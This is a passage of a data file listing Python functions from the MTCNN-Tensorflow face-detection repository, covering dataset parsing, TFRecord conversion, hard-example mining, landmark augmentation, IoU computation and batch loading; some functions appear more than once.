        for (i, image_example) in enumerate(dataset):
            if (i + 1) % 100 == 0:
                sys.stdout.write('\r>> %d/%d images has been converted' % (i + 1, len(dataset)))
            sys.stdout.flush()
            filename = image_example['filename']
            _add_to_tfrecord(filename, image_example, tfrecord_writer)
    print('\nFinished converting the MTCNN dataset!')"
AITTSMD/MTCNN-Tensorflow,get_dataset,"def get_dataset(dir, name, net='PNet'):
    """"""

    :param dir: directory of the raw data
    :param net:
    :return:
    """"""
    item = '%s/%s_24.txt' % (net, name)
    dataset_dir = os.path.join(dir, item)
    print('dataset dir is :', dataset_dir)
    imagelist = open(dataset_dir, 'r')
    dataset = []
    for line in imagelist.readlines():
        info = line.strip().split(' ')
        data_example = dict()
        bbox = dict()
        data_example['filename'] = info[0]
        data_example['label'] = int(info[1])
        bbox['xmin'] = 0
        bbox['ymin'] = 0
        bbox['xmax'] = 0
        bbox['ymax'] = 0
        bbox['xlefteye'] = 0
        bbox['ylefteye'] = 0
        bbox['xrighteye'] = 0
        bbox['yrighteye'] = 0
        bbox['xnose'] = 0
        bbox['ynose'] = 0
        bbox['xleftmouth'] = 0
        bbox['yleftmouth'] = 0
        bbox['xrightmouth'] = 0
        bbox['yrightmouth'] = 0
        if len(info) == 6:
            bbox['xmin'] = float(info[2])
            bbox['ymin'] = float(info[3])
            bbox['xmax'] = float(info[4])
            bbox['ymax'] = float(info[5])
        if len(info) == 12:
            bbox['xlefteye'] = float(info[2])
            bbox['ylefteye'] = float(info[3])
            bbox['xrighteye'] = float(info[4])
            bbox['yrighteye'] = float(info[5])
            bbox['xnose'] = float(info[6])
            bbox['ynose'] = float(info[7])
            bbox['xleftmouth'] = float(info[8])
            bbox['yleftmouth'] = float(info[9])
            bbox['xrightmouth'] = float(info[10])
            bbox['yrightmouth'] = float(info[11])
        data_example['bbox'] = bbox
        dataset.append(data_example)
    return dataset"
AITTSMD/MTCNN-Tensorflow,save_hard_example,"def save_hard_example(net, data, save_path):
    im_idx_list = data['images']
    gt_boxes_list = data['bboxes']
    num_of_images = len(im_idx_list)
    print('processing %d images in total' % num_of_images)
    neg_label_file = '../../DATA/no_LM%d/neg_%d.txt' % (net, image_size)
    neg_file = open(neg_label_file, 'w')
    pos_label_file = '../../DATA/no_LM%d/pos_%d.txt' % (net, image_size)
    pos_file = open(pos_label_file, 'w')
    part_label_file = '../../DATA/no_LM%d/part_%d.txt' % (net, image_size)
    part_file = open(part_label_file, 'w')
    det_boxes = pickle.load(open(os.path.join(save_path, 'detections.pkl'), 'rb'))
    print(len(det_boxes))
    print(num_of_images)
    assert len(det_boxes) == num_of_images, 'incorrect detections or ground truths'
    n_idx = 0
    p_idx = 0
    d_idx = 0
    image_done = 0
    for (im_idx, dets, gts) in zip(im_idx_list, det_boxes, gt_boxes_list):
        gts = np.array(gts, dtype=np.float32).reshape(-1, 4)
        if image_done % 100 == 0:
            print('%d images done' % image_done)
        image_done += 1
        if dets.shape[0] == 0:
            continue
        img = cv2.imread(im_idx)
        dets = convert_to_square(dets)
        dets[:, 0:4] = np.round(dets[:, 0:4])
        neg_num = 0
        for box in dets:
            (x_left, y_top, x_right, y_bottom, _) = box.astype(int)
            width = x_right - x_left + 1
            height = y_bottom - y_top + 1
            if width < 20 or x_left < 0 or y_top < 0 or (x_right > img.shape[1] - 1) or (y_bottom > img.shape[0] - 1):
                continue
            Iou = IoU(box, gts)
            cropped_im = img[y_top:y_bottom + 1, x_left:x_right + 1, :]
            resized_im = cv2.resize(cropped_im, (image_size, image_size), interpolation=cv2.INTER_LINEAR)
            if np.max(Iou) < 0.3 and neg_num < 60:
                save_file = get_path(neg_dir, '%s.jpg' % n_idx)
                neg_file.write(save_file + ' 0\n')
                cv2.imwrite(save_file, resized_im)
                n_idx += 1
                neg_num += 1
            else:
                idx = np.argmax(Iou)
                assigned_gt = gts[idx]
                (x1, y1, x2, y2) = assigned_gt
                offset_x1 = (x1 - x_left) / float(width)
                offset_y1 = (y1 - y_top) / float(height)
                offset_x2 = (x2 - x_right) / float(width)
                offset_y2 = (y2 - y_bottom) / float(height)
                if np.max(Iou) >= 0.65:
                    save_file = get_path(pos_dir, '%s.jpg' % p_idx)
                    pos_file.write(save_file + ' 1 %.2f %.2f %.2f %.2f\n' % (offset_x1, offset_y1, offset_x2, offset_y2))
                    cv2.imwrite(save_file, resized_im)
                    p_idx += 1
                elif np.max(Iou) >= 0.4:
                    save_file = os.path.join(part_dir, '%s.jpg' % d_idx)
                    part_file.write(save_file + ' -1 %.2f %.2f %.2f %.2f\n' % (offset_x1, offset_y1, offset_x2, offset_y2))
                    cv2.imwrite(save_file, resized_im)
                    d_idx += 1
    neg_file.close()
    part_file.close()
    pos_file.close()"
AITTSMD/MTCNN-Tensorflow,t_net,"def t_net(prefix, epoch, batch_size, test_mode='PNet', thresh=[0.6, 0.6, 0.7], min_face_size=25, stride=2, slide_window=False, shuffle=False, vis=False):
    detectors = [None, None, None]
    print('Test model: ', test_mode)
    model_path = ['%s-%s' % (x, y) for (x, y) in zip(prefix, epoch)]
    print(model_path[0])
    if slide_window:
        PNet = Detector(P_Net, 12, batch_size[0], model_path[0])
    else:
        PNet = FcnDetector(P_Net, model_path[0])
    detectors[0] = PNet
    if test_mode in ['RNet', 'ONet']:
        print('==================================', test_mode)
        RNet = Detector(R_Net, 24, batch_size[1], model_path[1])
        detectors[1] = RNet
    if test_mode == 'ONet':
        print('==================================', test_mode)
        ONet = Detector(O_Net, 48, batch_size[2], model_path[2])
        detectors[2] = ONet
    basedir = '../../DATA/'
    filename = './wider_face_train_bbx_gt.txt'
    data = read_annotation(basedir, filename)
    mtcnn_detector = MtcnnDetector(detectors=detectors, min_face_size=min_face_size, stride=stride, threshold=thresh, slide_window=slide_window)
    print('==================================')
    print('load test data')
    test_data = TestLoader(data['images'])
    print('finish loading')
    print('start detecting....')
    (detections, _) = mtcnn_detector.detect_face(test_data)
    print('finish detecting ')
    save_net = 'RNet'
    if test_mode == 'PNet':
        save_net = 'RNet'
    elif test_mode == 'RNet':
        save_net = 'ONet'
    save_path = os.path.join(data_dir, save_net)
    print('save_path is :')
    print(save_path)
    if not os.path.exists(save_path):
        os.mkdir(save_path)
    save_file = os.path.join(save_path, 'detections.pkl')
    with open(save_file, 'wb') as f:
        pickle.dump(detections, f, 1)
    print('%s测试完成开始OHEM' % image_size)
    save_hard_example(image_size, data, save_path)"
AITTSMD/MTCNN-Tensorflow,parse_args,"def parse_args():
    parser = argparse.ArgumentParser(description='Test mtcnn', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('--test_mode', dest='test_mode', help='test net type, can be pnet, rnet or onet', default='RNet', type=str)
    parser.add_argument('--prefix', dest='prefix', help='prefix of model name', nargs='+', default=['../data/MTCNN_model/PNet_No_Landmark/PNet', '../data/MTCNN_model/RNet_No_Landmark/RNet', '../data/MTCNN_model/ONet_No_Landmark/ONet'], type=str)
    parser.add_argument('--epoch', dest='epoch', help='epoch number of model to load', nargs='+', default=[18, 14, 16], type=int)
    parser.add_argument('--batch_size', dest='batch_size', help='list of batch size used in prediction', nargs='+', default=[2048, 256, 16], type=int)
    parser.add_argument('--thresh', dest='thresh', help='list of thresh for pnet, rnet, onet', nargs='+', default=[0.3, 0.1, 0.7], type=float)
    parser.add_argument('--min_face', dest='min_face', help='minimum face size for detection', default=20, type=int)
    parser.add_argument('--stride', dest='stride', help='stride of sliding window', default=2, type=int)
    parser.add_argument('--sw', dest='slide_window', help='use sliding window in pnet', action='store_true')
    parser.add_argument('--shuffle', dest='shuffle', help='shuffle data on visualization', action='store_true')
    parser.add_argument('--vis', dest='vis', help='turn on visualization', action='store_true')
    args = parser.parse_args()
    return args"
AITTSMD/MTCNN-Tensorflow,GenerateData,"def GenerateData(ftxt, data_path, net, argument=False):
    """"""

    :param ftxt: name/path of the text file that contains image path,
                bounding box, and landmarks

    :param output: path of the output dir
    :param net: one of the net in the cascaded networks
    :param argument: apply augmentation or not
    :return:  images and related landmarks
    """"""
    if net == 'PNet':
        size = 12
    elif net == 'RNet':
        size = 24
    elif net == 'ONet':
        size = 48
    else:
        print('Net type error')
        return
    image_id = 0
    f = open(join(OUTPUT, 'landmark_%s_aug.txt' % size), 'w')
    data = getDataFromTxt(ftxt, data_path=data_path)
    idx = 0
    for (imgPath, bbox, landmarkGt) in data:
        F_imgs = []
        F_landmarks = []
        img = cv2.imread(imgPath)
        assert img is not None
        (img_h, img_w, img_c) = img.shape
        gt_box = np.array([bbox.left, bbox.top, bbox.right, bbox.bottom])
        f_face = img[bbox.top:bbox.bottom + 1, bbox.left:bbox.right + 1]
        f_face = cv2.resize(f_face, (size, size))
        landmark = np.zeros((5, 2))
        for (index, one) in enumerate(landmarkGt):
            rv = ((one[0] - gt_box[0]) / (gt_box[2] - gt_box[0]), (one[1] - gt_box[1]) / (gt_box[3] - gt_box[1]))
            landmark[index] = rv
        F_imgs.append(f_face)
        F_landmarks.append(landmark.reshape(10))
        landmark = np.zeros((5, 2))
        if argument:
            idx = idx + 1
            if idx % 100 == 0:
                print(idx, 'images done')
            (x1, y1, x2, y2) = gt_box
            gt_w = x2 - x1 + 1
            gt_h = y2 - y1 + 1
            if max(gt_w, gt_h) < 40 or x1 < 0 or y1 < 0:
                continue
            for i in range(10):
                bbox_size = npr.randint(int(min(gt_w, gt_h) * 0.8), np.ceil(1.25 * max(gt_w, gt_h)))
                delta_x = npr.randint(-gt_w * 0.2, gt_w * 0.2)
                delta_y = npr.randint(-gt_h * 0.2, gt_h * 0.2)
                nx1 = int(max(x1 + gt_w / 2 - bbox_size / 2 + delta_x, 0))
                ny1 = int(max(y1 + gt_h / 2 - bbox_size / 2 + delta_y, 0))
                nx2 = nx1 + bbox_size
                ny2 = ny1 + bbox_size
                if nx2 > img_w or ny2 > img_h:
                    continue
                crop_box = np.array([nx1, ny1, nx2, ny2])
                cropped_im = img[ny1:ny2 + 1, nx1:nx2 + 1, :]
                resized_im = cv2.resize(cropped_im, (size, size))
                iou = IoU(crop_box, np.expand_dims(gt_box, 0))
                if iou > 0.65:
                    F_imgs.append(resized_im)
                    for (index, one) in enumerate(landmarkGt):
                        rv = ((one[0] - nx1) / bbox_size, (one[1] - ny1) / bbox_size)
                        landmark[index] = rv
                    F_landmarks.append(landmark.reshape(10))
                    landmark = np.zeros((5, 2))
                    landmark_ = F_landmarks[-1].reshape(-1, 2)
                    bbox = BBox([nx1, ny1, nx2, ny2])
                    if random.choice([0, 1]) > 0:
                        (face_flipped, landmark_flipped) = flip(resized_im, landmark_)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), 5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), -5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
            (F_imgs, F_landmarks) = (np.asarray(F_imgs), np.asarray(F_landmarks))
            for i in range(len(F_imgs)):
                if np.sum(np.where(F_landmarks[i] <= 0, 1, 0)) > 0:
                    continue
                if np.sum(np.where(F_landmarks[i] >= 1, 1, 0)) > 0:
                    continue
                cv2.imwrite(join(dstdir, '%d.jpg' % image_id), F_imgs[i])
                landmarks = map(str, list(F_landmarks[i]))
                f.write(join(dstdir, '%d.jpg' % image_id) + ' -2 ' + ' '.join(landmarks) + '\n')
                image_id = image_id + 1
    f.close()
    return (F_imgs, F_landmarks)"
AITTSMD/MTCNN-Tensorflow,IoU,"def IoU(box, boxes):
    """"""Compute IoU between detect box and gt boxes

    Parameters:
    ----------
    box: numpy array , shape (5, ): x1, y1, x2, y2, score
        input box
    boxes: numpy array, shape (n, 4): x1, y1, x2, y2
        input ground truth boxes

    Returns:
    -------
    ovr: numpy.array, shape (n, )
        IoU
    """"""
    box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)
    area = (boxes[:, 2] - boxes[:, 0] + 1) * (boxes[:, 3] - boxes[:, 1] + 1)
    xx1 = np.maximum(box[0], boxes[:, 0])
    yy1 = np.maximum(box[1], boxes[:, 1])
    xx2 = np.minimum(box[2], boxes[:, 2])
    yy2 = np.minimum(box[3], boxes[:, 3])
    w = np.maximum(0, xx2 - xx1 + 1)
    h = np.maximum(0, yy2 - yy1 + 1)
    inter = w * h
    ovr = inter * 1.0 / (box_area + area - inter)
    return ovr"
AITTSMD/MTCNN-Tensorflow,GenerateData,"def GenerateData(ftxt, output, net, argument=False):
    if net == 'PNet':
        size = 12
    elif net == 'RNet':
        size = 24
    elif net == 'ONet':
        size = 48
    else:
        print('Net type error')
        return
    image_id = 0
    f = open(join(OUTPUT, 'landmark_%s_aug.txt' % size), 'w')
    data = getDataFromTxt(ftxt)
    idx = 0
    for (imgPath, bbox, landmarkGt) in data:
        F_imgs = []
        F_landmarks = []
        img = cv2.imread(imgPath)
        assert img is not None
        (img_h, img_w, img_c) = img.shape
        gt_box = np.array([bbox.left, bbox.top, bbox.right, bbox.bottom])
        f_face = img[bbox.top:bbox.bottom + 1, bbox.left:bbox.right + 1]
        f_face = cv2.resize(f_face, (size, size))
        landmark = np.zeros((5, 2))
        for (index, one) in enumerate(landmarkGt):
            rv = ((one[0] - gt_box[0]) / (gt_box[2] - gt_box[0]), (one[1] - gt_box[1]) / (gt_box[3] - gt_box[1]))
            landmark[index] = rv
        F_imgs.append(f_face)
        F_landmarks.append(landmark.reshape(10))
        landmark = np.zeros((5, 2))
        if argument:
            idx = idx + 1
            if idx % 100 == 0:
                print(idx, 'images done')
            (x1, y1, x2, y2) = gt_box
            gt_w = x2 - x1 + 1
            gt_h = y2 - y1 + 1
            if max(gt_w, gt_h) < 40 or x1 < 0 or y1 < 0:
                continue
            for i in range(10):
                bbox_size = npr.randint(int(min(gt_w, gt_h) * 0.8), np.ceil(1.25 * max(gt_w, gt_h)))
                delta_x = npr.randint(-gt_w * 0.2, gt_w * 0.2)
                delta_y = npr.randint(-gt_h * 0.2, gt_h * 0.2)
                nx1 = int(max(x1 + gt_w / 2 - bbox_size / 2 + delta_x, 0))
                ny1 = int(max(y1 + gt_h / 2 - bbox_size / 2 + delta_y, 0))
                nx2 = nx1 + bbox_size
                ny2 = ny1 + bbox_size
                if nx2 > img_w or ny2 > img_h:
                    continue
                crop_box = np.array([nx1, ny1, nx2, ny2])
                cropped_im = img[ny1:ny2 + 1, nx1:nx2 + 1, :]
                resized_im = cv2.resize(cropped_im, (size, size))
                iou = IoU(crop_box, np.expand_dims(gt_box, 0))
                if iou > 0.65:
                    F_imgs.append(resized_im)
                    for (index, one) in enumerate(landmarkGt):
                        rv = ((one[0] - nx1) / bbox_size, (one[1] - ny1) / bbox_size)
                        landmark[index] = rv
                    F_landmarks.append(landmark.reshape(10))
                    landmark = np.zeros((5, 2))
                    landmark_ = F_landmarks[-1].reshape(-1, 2)
                    bbox = BBox([nx1, ny1, nx2, ny2])
                    if random.choice([0, 1]) > 0:
                        (face_flipped, landmark_flipped) = flip(resized_im, landmark_)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), 5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), -5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
            (F_imgs, F_landmarks) = (np.asarray(F_imgs), np.asarray(F_landmarks))
            for i in range(len(F_imgs)):
                if np.sum(np.where(F_landmarks[i] <= 0, 1, 0)) > 0:
                    continue
                if np.sum(np.where(F_landmarks[i] >= 1, 1, 0)) > 0:
                    continue
                cv2.imwrite(join(dstdir, '%d.jpg' % image_id), F_imgs[i])
                landmarks = map(str, list(F_landmarks[i]))
                f.write(join(dstdir, '%d.jpg' % image_id) + ' -2 ' + ' '.join(landmarks) + '\n')
                image_id = image_id + 1
    f.close()
    return (F_imgs, F_landmarks)"
AITTSMD/MTCNN-Tensorflow,IoU,"def IoU(box, boxes):
    """"""Compute IoU between detect box and gt boxes

    Parameters:
    ----------
    box: numpy array , shape (5, ): x1, y1, x2, y2, score
        input box
    boxes: numpy array, shape (n, 4): x1, y1, x2, y2
        input ground truth boxes

    Returns:
    -------
    ovr: numpy.array, shape (n, )
        IoU
    """"""
    box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)
    area = (boxes[:, 2] - boxes[:, 0] + 1) * (boxes[:, 3] - boxes[:, 1] + 1)
    xx1 = np.maximum(box[0], boxes[:, 0])
    yy1 = np.maximum(box[1], boxes[:, 1])
    xx2 = np.minimum(box[2], boxes[:, 2])
    yy2 = np.minimum(box[3], boxes[:, 3])
    w = np.maximum(0, xx2 - xx1 + 1)
    h = np.maximum(0, yy2 - yy1 + 1)
    inter = w * h
    ovr = inter * 1.0 / (box_area + area - inter)
    return ovr"
AITTSMD/MTCNN-Tensorflow,GenerateData,"def GenerateData(ftxt, output, net, argument=False):
    if net == 'PNet':
        size = 12
    elif net == 'RNet':
        size = 24
    elif net == 'ONet':
        size = 48
    else:
        print('Net type error')
        return
    image_id = 0
    f = open(join(OUTPUT, 'landmark_%s_aug.txt' % size), 'w')
    data = getDataFromTxt(ftxt)
    idx = 0
    for (imgPath, bbox, landmarkGt) in data:
        F_imgs = []
        F_landmarks = []
        img = cv2.imread(imgPath)
        assert img is not None
        (img_h, img_w, img_c) = img.shape
        gt_box = np.array([bbox.left, bbox.top, bbox.right, bbox.bottom])
        f_face = img[bbox.top:bbox.bottom + 1, bbox.left:bbox.right + 1]
        f_face = cv2.resize(f_face, (size, size))
        landmark = np.zeros((5, 2))
        for (index, one) in enumerate(landmarkGt):
            rv = ((one[0] - gt_box[0]) / (gt_box[2] - gt_box[0]), (one[1] - gt_box[1]) / (gt_box[3] - gt_box[1]))
            landmark[index] = rv
        F_imgs.append(f_face)
        F_landmarks.append(landmark.reshape(10))
        landmark = np.zeros((5, 2))
        if argument:
            idx = idx + 1
            if idx % 100 == 0:
                print(idx, 'images done')
            (x1, y1, x2, y2) = gt_box
            gt_w = x2 - x1 + 1
            gt_h = y2 - y1 + 1
            if max(gt_w, gt_h) < 40 or x1 < 0 or y1 < 0:
                continue
            for i in range(10):
                bbox_size = npr.randint(int(min(gt_w, gt_h) * 0.8), np.ceil(1.25 * max(gt_w, gt_h)))
                delta_x = npr.randint(-gt_w * 0.2, gt_w * 0.2)
                delta_y = npr.randint(-gt_h * 0.2, gt_h * 0.2)
                nx1 = int(max(x1 + gt_w / 2 - bbox_size / 2 + delta_x, 0))
                ny1 = int(max(y1 + gt_h / 2 - bbox_size / 2 + delta_y, 0))
                nx2 = nx1 + bbox_size
                ny2 = ny1 + bbox_size
                if nx2 > img_w or ny2 > img_h:
                    continue
                crop_box = np.array([nx1, ny1, nx2, ny2])
                cropped_im = img[ny1:ny2 + 1, nx1:nx2 + 1, :]
                resized_im = cv2.resize(cropped_im, (size, size))
                iou = IoU(crop_box, np.expand_dims(gt_box, 0))
                if iou > 0.65:
                    F_imgs.append(resized_im)
                    for (index, one) in enumerate(landmarkGt):
                        rv = ((one[0] - nx1) / bbox_size, (one[1] - ny1) / bbox_size)
                        landmark[index] = rv
                    F_landmarks.append(landmark.reshape(10))
                    landmark = np.zeros((5, 2))
                    landmark_ = F_landmarks[-1].reshape(-1, 2)
                    bbox = BBox([nx1, ny1, nx2, ny2])
                    if random.choice([0, 1]) > 0:
                        (face_flipped, landmark_flipped) = flip(resized_im, landmark_)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), 5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
                    if random.choice([0, 1]) > 0:
                        (face_rotated_by_alpha, landmark_rotated) = rotate(img, bbox, bbox.reprojectLandmark(landmark_), -5)
                        landmark_rotated = bbox.projectLandmark(landmark_rotated)
                        face_rotated_by_alpha = cv2.resize(face_rotated_by_alpha, (size, size))
                        F_imgs.append(face_rotated_by_alpha)
                        F_landmarks.append(landmark_rotated.reshape(10))
                        (face_flipped, landmark_flipped) = flip(face_rotated_by_alpha, landmark_rotated)
                        face_flipped = cv2.resize(face_flipped, (size, size))
                        F_imgs.append(face_flipped)
                        F_landmarks.append(landmark_flipped.reshape(10))
            (F_imgs, F_landmarks) = (np.asarray(F_imgs), np.asarray(F_landmarks))
            for i in range(len(F_imgs)):
                if np.sum(np.where(F_landmarks[i] <= 0, 1, 0)) > 0:
                    continue
                if np.sum(np.where(F_landmarks[i] >= 1, 1, 0)) > 0:
                    continue
                cv2.imwrite(join(dstdir, '%d.jpg' % image_id), F_imgs[i])
                landmarks = map(str, list(F_landmarks[i]))
                f.write(join(dstdir, '%d.jpg' % image_id) + ' -2 ' + ' '.join(landmarks) + '\n')
                image_id = image_id + 1
    f.close()
    return (F_imgs, F_landmarks)"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, imdb, batch_size=1, shuffle=False):
    self.imdb = imdb
    self.batch_size = batch_size
    self.shuffle = shuffle
    self.size = len(imdb)
    self.cur = 0
    self.data = None
    self.label = None
    self.reset()
    self.get_batch()"
AITTSMD/MTCNN-Tensorflow,reset,"def reset(self):
    self.cur = 0
    if self.shuffle:
        np.random.shuffle(self.imdb)"
AITTSMD/MTCNN-Tensorflow,iter_next,"def iter_next(self):
    return self.cur + self.batch_size <= self.size"
AITTSMD/MTCNN-Tensorflow,__iter__,"def __iter__(self):
    return self"
AITTSMD/MTCNN-Tensorflow,__next__,"def __next__(self):
    return self.next()"
AITTSMD/MTCNN-Tensorflow,next,"def next(self):
    if self.iter_next():
        self.get_batch()
        self.cur += self.batch_size
        return self.data
    else:
        raise StopIteration"
AITTSMD/MTCNN-Tensorflow,getindex,"def getindex(self):
    return self.cur / self.batch_size"
AITTSMD/MTCNN-Tensorflow,getpad,"def getpad(self):
    if self.cur + self.batch_size > self.size:
        return self.cur + self.batch_size - self.size
    else:
        return 0"
AITTSMD/MTCNN-Tensorflow,get_batch,"def get_batch(self):
    imdb = self.imdb[self.cur]
    '\n        cur_from = self.cur\n        cur_to = min(cur_from + self.batch_size, self.size)\n        #picked image\n        imdb = [self.imdb[self.index[i]] for i in range(cur_from, cur_to)]\n        # print(imdb)\n        '
    im = cv2.imread(imdb)
    self.data = im"
AITTSMD/MTCNN-Tensorflow,__init__,"def __init__(self, imdb, im_size, batch_size=config.BATCH_SIZE, shuffle=False):
    self.imdb = imdb
    self.batch_size = batch_size
    self.im_size = im_size
    self.shuffle = shuffle
    self.cur = 0
    self.size = len(imdb)
    self.index = np.arange(self.size)
    self.num_classes = 2
    self.batch = None
    self.data = None
    self.label = None
    self.label_names = ['label', 'bbox_target']
    self.reset()
    self.get_batch()"
AITTSMD/MTCNN-Tensorflow,reset,"def reset(self):
    self.cur = 0
    if self.shuffle:
        np.random.shuffle(self.index)"
AITTSMD/MTCNN-Tensorflow,iter_next,"def iter_next(self):
    return self.cur + self.batch_size <= self.size"
AITTSMD/MTCNN-Tensorflow,__iter__,"def __iter__(self):
    return self"
AITTSMD/MTCNN-Tensorflow,__next__,"def __next__(self):
    return self.next()"
AITTSMD/MTCNN-Tensorflow,next,"def next(self):
    if self.iter_next():
        self.get_batch()
        self.cur += self.batch_size
        return (self.data, self.label)
    else:
        raise StopIteration"
AITTSMD/MTCNN-Tensorflow,getindex,"def getindex(self):
    return self.cur / self.batch_size"
AITTSMD/MTCNN-Tensorflow,getpad,"def getpad(self):
    if self.cur + self.batch_size > self.size:
        return self.cur + self.batch_size - self.size
    else:
        return 0"
AITTSMD/MTCNN-Tensorflow,get_batch,"def get_batch(self):
    cur_from = self.cur
    cur_to = min(cur_from + self.batch_size, self.size)
    imdb = [self.imdb[self.index[i]] for i in range(cur_from, cur_to)]
    (data, label) = minibatch.get_minibatch(imdb, self.num_classes, self.im_size)
    self.data = data['data']
    self.label = [label[name] for name in self.label_names]"
AITTSMD/MTCNN-Tensorflow,get_minibatch,"def get_minibatch(imdb, num_classes, im_size):
    num_images = len(imdb)
    processed_ims = list()
    cls_label = list()
    bbox_reg_target = list()
    for i in range(num_images):
        im = cv2.imread(imdb[i]['image'])
        (h, w, c) = im.shape
        cls = imdb[i]['label']
        bbox_target = imdb[i]['bbox_target']
        assert h == w == im_size, 'image size wrong'
        if imdb[i]['flipped']:
            im = im[:, ::-1, :]
        im_tensor = im / 127.5
        processed_ims.append(im_tensor)
        cls_label.append(cls)
        bbox_reg_target.append(bbox_target)
    im_array = np.asarray(processed_ims)
    label_array = np.array(cls_label)
    bbox_target_array = np.vstack(bbox_reg_target)
    '\n    bbox_reg_weight = np.ones(label_array.shape)\n    invalid = np.where(label_array == 0)[0]\n    bbox_reg_weight[invalid] = 0\n    bbox_reg_weight = np.repeat(bbox_reg_weight, 4, axis=1)\n    '
    data = {'data': im_array}
    label = {'label': label_array, 'bbox_target': bbox_target_array}
    return (data, label)"
AITTSMD/MTCNN-Tensorflow,get_testbatch,"def get_testbatch(imdb):
    assert len(imdb) == 1, 'Single batch only'
    im = cv2.imread(imdb)
    im_array = im
    data = {'data': im_array}
    return data"
AITTSMD/MTCNN-Tensorflow,read_single_tfrecord,"def read_single_tfrecord(tfrecord_file, batch_size, net):
    filename_queue = tf.train.string_input_producer([tfrecord_file], shuffle=True)
    reader = tf.TFRecordReader()
    (_, serialized_example) = reader.read(filename_queue)
    image_features = tf.parse_single_example(serialized_example, features={'image/encoded': tf.FixedLenFeature([], tf.string), 'image/label': tf.FixedLenFeature([], tf.int64), 'image/roi': tf.FixedLenFeature([4], tf.float32), 'image/landmark': tf.FixedLenFeature([10], tf.float32)})
    if net == 'PNet':
        image_size = 12
    elif net == 'RNet':
        image_size = 24
    else:
        image_size = 48
    image = tf.decode_raw(image_features['image/encoded'], tf.uint8)
    image = tf.reshape(image, [image_size, image_size, 3])
    image = (tf.cast(image, tf.float32) - 127.5) / 128
    label = tf.cast(image_features['image/label'], tf.float32)
    roi = tf.cast(image_features['image/roi'], tf.float32)
    landmark = tf.cast(image_features['image/landmark'], tf.float32)
    (image, label, roi, landmark) = tf.train.batch([image, label, roi, landmark], batch_size=batch_size, num_threads=2, capacity=1 * batch_size)
    label = tf.reshape(label, [batch_size])
    roi = tf.reshape(roi, [batch_size, 4])
    landmark = tf.reshape(landmark, [batch_size, 10])
    return (image, label, roi, landmark)"
AITTSMD/MTCNN-Tensorflow,read_multi_tfrecords,"def read_multi_tfrecords(tfrecord_files, batch_sizes, net):
    (pos_dir, part_dir, neg_dir, landmark_dir) = tfrecord_files
    (pos_batch_size, part_batch_size, neg_batch_size, landmark_batch_size) = batch_sizes
    (pos_image, pos_label, pos_roi, pos_landmark) = read_single_tfrecord(pos_dir, pos_batch_size, net)
    print(pos_image.get_shape())
    (part_image, part_label, part_roi, part_landmark) = read_single_tfrecord(part_dir, part_batch_size, net)
    print(part_image.get_shape())
    (neg_image, neg_label, neg_roi, neg_landmark) = read_single_tfrecord(neg_dir, neg_batch_size, net)
    print(neg_image.get_shape())
    (landmark_image, landmark_label, landmark_roi, landmark_landmark) = read_single_tfrecord(landmark_dir, landmark_batch_size, net)
    print(landmark_image.get_shape())
